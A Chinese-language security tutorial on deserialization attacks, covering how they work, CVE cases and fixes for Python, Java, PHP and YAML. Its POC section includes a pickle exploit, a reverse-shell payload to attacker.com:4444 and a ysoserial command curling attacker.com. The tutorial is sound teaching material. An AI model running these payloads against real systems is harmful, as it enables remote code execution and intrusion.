# 反序列化攻击（Deserialization Attack）

> **一句话定义**：攻击者利用应用程序反序列化不可信数据的过程，构造恶意序列化对象来执行任意代码或发起其他攻击。

**危险等级**：🔴 严重
**OWASP Top 10 2017**：A08 — Insecure Deserialization（第 8 位）

---

## 原理深度分析

### 为什么发生

序列化（Serialization）是将对象转换为字节流或字符串的过程，反序列化（Deserialization）是反向过程。

当应用程序反序列化不可信的数据时，攻击者可以：

1. **注入恶意对象**：构造特殊的序列化数据，在反序列化时触发对象的魔术方法
2. **链式利用（Gadget Chains）**：利用已有类的特定方法组合，拼出完整的攻击链
3. **POP Chain（Property-Oriented Programming）**：通过设置对象的属性来触发危险操作

### 受影响的生态系统

| 语言/框架 | 常见序列化格式 | 风险等级 |
|-----------|---------------|---------|
| Python | `pickle`, `jsonpickle`, `PyYAML(yaml.load)` | 🔴 高危 |
| Java | `ObjectInputStream`, `readObject()` | 🔴 高危 |
| PHP | `unserialize()` | 🔴 高危 |
| .NET | `BinaryFormatter`, `SoapFormatter` | 🔴 高危 |
| Ruby | `Marshal.load`, `YAML.load` | 🟡 中危 |
| Node.js | `node-serialize`, `funcion-serialize` | 🟡 中危 |

---

## 真实世界案例

### 案例 1：Apache Struts 2 RCE（2017, CVE-2017-9805）

Equifax 数据泄露的根源之一，利用 Struts 2 REST 插件的反序列化漏洞。

- **攻击方式**：发送精心构造的 XML 请求触发反序列化
- **后果**：1.47 亿条记录泄露，罚款 5.75 亿美元
- **教训**：框架自带的反序列化功能也是攻击面

### 案例 2：WebLogic CVE-2018-2628

Oracle WebLogic 的 T3 协议反序列化 RCE 漏洞。

- **攻击方式**：通过 T3 协议发送恶意序列化对象
- **影响**：大量未打补丁的 WebLogic 服务器被入侵
- **教训**：序列化协议通信需要严格验证和加密

### 案例 3：ysoserial（2015至今）

ysoserial 是 Java 反序列化利用的"瑞士军刀"，集成了数十种 Gadget Chain。

- **原理**：利用 Java 标准库和常见框架中的类，组合出可利用的调用链
- **影响**：几乎所有 Java 反序列化漏洞都可以用 ysoserial 利用

---

## 简单 POC

### Python Pickle 反序列化

```python
# victim.py — 有漏洞的应用
import pickle
from flask import Flask, request

app = Flask(__name__)

# 🔴 漏洞：反序列化不可信数据
@app.route('/load-session', methods=['POST'])
def load_session():
    session_data = request.get_data()
    
    # 反序列化用户数据
    obj = pickle.loads(session_data)  # 🔴 高危！
    
    return f"Session loaded: {obj}"

if __name__ == '__main__':
    app.run(port=5011)
```

```python
# exploit.py — 攻击者构造的恶意 payload
import pickle
import os
import requests

# 构造恶意类的实例
class EvilPickle(object):
    def __reduce__(self):
        # __reduce__ 在反序列化时执行
        # 这里返回 (函数, (参数,))，pickle 会调用这个函数
        return (os.system, ('whoami',))

# 生成恶意序列化数据
malicious_data = pickle.dumps(EvilPickle())

# 发送到目标
response = requests.post(
    'http://localhost:5011/load-session',
    data=malicious_data
)
print(response.text)

# 更高级的 payload：反弹 shell
class ReverseShell(object):
    def __reduce__(self):
        import os
        return (os.system, (
            'python3 -c "import socket,subprocess;'
            's=socket.socket();s.connect((\'attacker.com\',4444));'
            'subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),'
            'stdout=s.fileno(),stderr=s.fileno())"',
        ))

# 或者执行任意 Python 代码
class ArbitraryCode(object):
    def __reduce__(self):
        return (eval, ("__import__('os').popen('dir').read()",))
```

### Java 反序列化（使用 ysoserial）

```bash
# 使用 ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/steal' > payload.bin

# 发送到 Java 反序列化接口
curl -X POST --data-binary @payload.bin "http://target.com/rpc/deserialize"
```

### PHP 反序列化

```php
<?php
// victim.php — 有漏洞的 PHP 应用
class User {
    public $username;
    public $isAdmin;
    
    public function __wakeup() {
        // 🔴 __wakeup() 在反序列化时自动调用
        if ($this->isAdmin) {
            echo "Admin access granted for: " . $this->username;
        }
    }
}

// 攻击者构造
$payload = 'O:4:"User":2:{s:8:"username";s:5:"admin";s:7:"isAdmin";b:1;}';
// 解码：User 对象，username="admin", isAdmin=true
$user = unserialize($payload); // 🔴 高危！
?>
```

### YAML 反序列化

```python
import yaml

# 🔴 漏洞：yaml.load() 可以执行任意代码
data = yaml.load("!!python/object/apply:os.system ['whoami']")

# ✅ 安全：yaml.safe_load() 只解析基本类型
data = yaml.safe_load(yaml_string)
```

---

## 修复方案

### 方案 1：避免反序列化不可信数据 ⭐⭐⭐⭐⭐

```python
# ✅ 最安全的方案：不使用反序列化

# 使用 JSON 替代 pickle
import json

@app.route('/load-session-json', methods=['POST'])
def load_session_json():
    data = request.get_json()
    # JSON 是安全的，不会执行任意代码
    username = data.get('username', 'guest')
    return f"Hello, {username}!"
```

| 不安全格式 | 安全替代 |
|-----------|---------|
| Python `pickle` | `json` + 手动 type casting |
| Java `ObjectInputStream` | JSON/XML + 明确定义的 schema |
| PHP `unserialize()` | `json_decode()` |
| YAML `yaml.load()` | `yaml.safe_load()` |

### 方案 2：使用安全的序列化格式 ⭐⭐⭐⭐

```python
# 使用 MessagePack（有明确 schema 定义）
import msgpack

data = msgpack.packb({'user': 'admin', 'role': 'admin'})
obj = msgpack.unpackb(data)
# msgpack 不会执行任意代码
```

### 方案 3：签名验证 ⭐⭐⭐⭐

```python
import hmac
import hashlib
import pickle

SECRET_KEY = b'your-secret-key-here'

def safe_pickle_dumps(obj):
    """加签名的序列化"""
    data = pickle.dumps(obj)
    signature = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    return signature + ':' + data.hex()

def safe_pickle_loads(signed_data):
    """验证签名的反序列化"""
    signature, hex_data = signed_data.split(':', 1)
    data = bytes.fromhex(hex_data)
    
    expected = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(signature, expected):
        raise ValueError("数据签名无效")
    
    return pickle.loads(data)
```

### 方案 4：白名单类 ⭐⭐⭐

```python
import pickle

class SafeUnpickler(pickle.Unpickler):
    """只允许指定类的反序列化"""
    ALLOWED_CLASSES = {
        'builtins.dict',
        'builtins.list',
        'builtins.str',
        'builtins.int',
        'builtins.float',
        'builtins.bool',
        'builtins.NoneType',
    }
    
    def find_class(self, module, name):
        if f'{module}.{name}' not in self.ALLOWED_CLASSES:
            raise pickle.UnpicklingError(f"禁止的类: {module}.{name}")
        return super().find_class(module, name)

# 使用安全的 Unpickler
safe_unpickler = SafeUnpickler(io.BytesIO(data))
obj = safe_unpickler.load()
```

### PHP 反序列化修复

```php
<?php
// PHP 7.1+ 使用 filter 白名单
// php.ini 配置
unserialize_allowed_classes = ['MyClass', 'UserDTO'];

// 或者在代码中
$user = unserialize($data, ['allowed_classes' => ['User']]);
?>
```

---

## 检测与防御工具

| 工具 | 语言 | 用途 |
|------|------|------|
| [ysoserial](https://github.com/frohoff/ysoserial) | Java | 生成 Java 反序列化 payload（测试用） |
| [PHPGGC](https://github.com/ambionics/phpggc) | PHP | PHP Gadget Chain 利用库 |
| [Pickora](https://github.com/dirty-fingers/pickora) | Python | Pickle 反序列化检测 |
| [GadgetInspector](https://github.com/JackOfMostTrades/gadgetinspector) | Java | 自动发现 Gadget Chain |
| [Semgrep](https://semgrep.dev/) | 多语言 | 静态检测不安全的反序列化 |

---

## 延伸阅读

1. [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
2. [PortSwigger Deserialization 教程](https://portswigger.net/web-security/deserialization)
3. [Java Deserialization — Marshalsec](https://github.com/mbechler/marshalsec)
4. [Python Pickle 安全问题](https://docs.python.org/3/library/pickle.html#restricting-globals)
5. [ysoserial 项目主页](https://github.com/frohoff/ysoserial)
